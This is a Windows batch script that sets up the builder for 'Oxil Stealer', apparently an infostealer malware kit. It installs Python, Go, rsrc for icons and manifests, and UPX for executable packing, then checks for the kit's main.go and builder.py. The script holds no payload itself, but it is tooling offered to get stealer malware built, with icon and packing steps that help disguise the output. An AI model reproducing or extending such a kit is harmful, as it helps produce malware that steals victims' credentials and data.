@echo off
title Oxil Stealer - Builder Setup
chcp 65001 >nul 2>&1
setlocal enabledelayedexpansion

:: Prevent automatic window closure
if "%~1"=="keepopen" goto :main
start "" cmd /k "%~f0" keepopen
exit /b

:main

echo ========================================
echo  Oxil Stealer - Builder Setup
echo ========================================
echo.

:: Note: This script does not require administrator privileges
:: Some installations (Python, Go via winget) may prompt for admin, but are optional
:: All pip installs work without admin rights

:: ========================================
:: Python verification and installation
:: ========================================
echo [1/6] Checking Python...

python --version >nul 2>&1
if errorlevel 1 goto :install_python

for /f "tokens=2" %%i in ('python --version') do set PYTHON_VERSION=%%i
echo [OK] Python found: !PYTHON_VERSION!
goto :python_done

:install_python
echo [INFO] Python not found. Installation required...
echo [INFO] Attempting to install Python via winget (may require admin)...
echo [INFO] If this fails, please install Python manually from https://www.python.org/downloads/

winget install Python.Python.3.11 --silent --accept-package-agreements --accept-source-agreements >nul 2>&1
if errorlevel 1 (
    echo [WARNING] Installation via winget failed (may need admin rights).
    echo [INFO] Please install Python manually from https://www.python.org/downloads/
    echo [INFO] Or run this script as administrator to install Python automatically.
    goto :end
)

echo [OK] Python installed via winget.
call refreshenv >nul 2>&1
timeout /t 2 >nul

python --version >nul 2>&1
if errorlevel 1 (
    echo [ERROR] Python still not found after installation. Please restart your terminal.
    goto :end
)

:python_done

:: Check tkinter
python -c "import tkinter" >nul 2>&1
if errorlevel 1 (
    echo [WARNING] tkinter not found. Attempting installation...
    python -m pip install tk >nul 2>&1
    if errorlevel 1 (
        echo [WARNING] tk installation failed. GUI may not work.
    ) else (
        echo [OK] Tkinter installed.
    )
)

echo.

:: ========================================
:: Python libraries verification and installation
:: ========================================
echo [2/6] Checking Python libraries...

:: Check and install requests
python -c "import requests" >nul 2>&1
if errorlevel 1 (
    echo [INFO] Installing requests...
    python -m pip install requests >nul 2>&1
    if errorlevel 1 (
        echo [ERROR] Failed to install requests.
        goto :end
    ) else (
        echo [OK] requests installed successfully.
    )
) else (
    echo [OK] requests already installed.
)

:: Check and install Pillow (for icon preview in GUI)
python -c "import PIL" >nul 2>&1
if errorlevel 1 goto :install_pillow
echo [OK] Pillow already installed.
goto :pillow_done

:install_pillow
echo [INFO] Installing Pillow (for icon preview)...
python -m pip install Pillow >nul 2>&1
if errorlevel 1 (
    echo [WARNING] Pillow installation failed. Icon preview may not work.
) else (
    echo [OK] Pillow installed successfully.
)

:pillow_done

echo.

:: ========================================
:: Go verification and installation
:: ========================================
echo [3/6] Checking Go...

go version >nul 2>&1
if errorlevel 1 goto :install_go

for /f "tokens=3" %%i in ('go version') do set GO_VERSION=%%i
echo [OK] Go found: !GO_VERSION!
goto :go_done

:install_go
echo [INFO] Go not found. Installation required...
echo [INFO] Attempting to install Go via winget (may require admin)...
echo [INFO] If this fails, please install Go manually from https://go.dev/dl/

winget install GoLang.Go --silent --accept-package-agreements --accept-source-agreements >nul 2>&1
if errorlevel 1 (
    echo [WARNING] Installation via winget failed (may need admin rights).
    echo [INFO] Please install Go manually from https://go.dev/dl/
    echo [INFO] Or run this script as administrator to install Go automatically.
    goto :end
)

echo [OK] Go installed via winget.
call refreshenv >nul 2>&1
timeout /t 2 >nul

go version >nul 2>&1
if errorlevel 1 (
    echo [ERROR] Go still not found after installation. Please restart your terminal.
    goto :end
)

:go_done

:: Download Go dependencies (go mod download)
echo [INFO] Downloading Go module dependencies...
go mod download >nul 2>&1
if errorlevel 1 (
    echo [WARNING] Some Go dependencies may have failed to download.
    echo [INFO] You can run 'go mod download' manually if needed.
) else (
    echo [OK] Go dependencies downloaded successfully.
)

echo.

:: ========================================
:: rsrc tool verification and installation (optional)
:: ========================================
echo [4/6] Checking rsrc tool (optional, for icons and manifests)...

where rsrc >nul 2>&1
if errorlevel 1 goto :install_rsrc
echo [OK] rsrc found (for icons and manifests).
goto :rsrc_done

:install_rsrc
echo [INFO] rsrc not found. Attempting installation...
go install github.com/akavel/rsrc@latest >nul 2>&1
if errorlevel 1 (
    echo [WARNING] rsrc installation failed. It is optional for icons.
    echo [INFO] You can install it manually: go install github.com/akavel/rsrc@latest
    goto :rsrc_done
)

:: Add Go bin to PATH if not already there
set "GOPATH=%USERPROFILE%\go"
set "GOBIN=%GOPATH%\bin"
if exist "%GOBIN%\rsrc.exe" (
    echo [OK] rsrc installed successfully.
) else (
    echo [WARNING] rsrc installed but may not be in PATH.
    echo [INFO] Add %GOBIN% to your PATH or use full path to rsrc.
)

:rsrc_done

echo.

:: ========================================
:: UPX verification (optional, for compression)
:: ========================================
echo [5/6] Checking UPX (optional, for executable compression)...

where upx >nul 2>&1
if errorlevel 1 goto :upx_not_found
echo [OK] UPX found (for executable compression).
goto :upx_done

:upx_not_found
echo [INFO] UPX not found. It is optional for compressing executables.
echo [INFO] To install: Download from https://github.com/upx/upx/releases/
echo [INFO] Or use winget: winget install UPX.UPX

:upx_done

echo.

:: ========================================
:: Project files verification
:: ========================================
echo [6/6] Checking project files...

if not exist "main.go" (
    echo [ERROR] main.go not found in current directory.
    goto :end
) else (
    echo [OK] main.go found.
)

if not exist "builder.py" (
    echo [ERROR] builder.py not found. Please ensure builder.py exists in the project directory.
    goto :end
) else (
    echo [OK] builder.py found.
)

echo.
echo ========================================
echo  Setup completed successfully!
echo ========================================
echo.
echo [INFO] All dependencies are ready.
echo [INFO] You can now run start.bat to launch the builder.
echo.

:end
echo.
echo ========================================
echo  Setup process finished!
echo ========================================
echo.
echo [INFO] This window will remain open.
echo [INFO] Type 'exit' and press Enter to close, or click the X button.
echo.
:: Keep window open - use pause first, then cmd /k as backup
pause
cmd /k
